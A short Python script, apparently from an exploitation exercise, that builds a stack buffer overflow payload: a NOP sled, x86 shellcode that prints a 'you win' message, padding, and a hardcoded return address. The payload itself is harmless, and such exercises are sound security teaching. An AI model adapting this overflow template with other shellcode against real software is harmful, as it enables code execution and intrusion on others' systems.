# payload.py
from struct import pack

#shellcode, imprime XXXXXX
shellcode = "\xeb\x11\x59\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x11\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xea\xff\xff\xff\x79\x6f\x75\x20\x77\x69\x6e\x20\x41\x62\x72\x61\x68\x61\x6d\x21\x0b"

ret_addr = 0xbffff5b4

output = "\x90" * 10
output += shellcode
output += "A" * (80 - 10 - len(shellcode))
output += "BBBB"
output += "CCCC"
output += pack("<I", ret_addr)

print(output)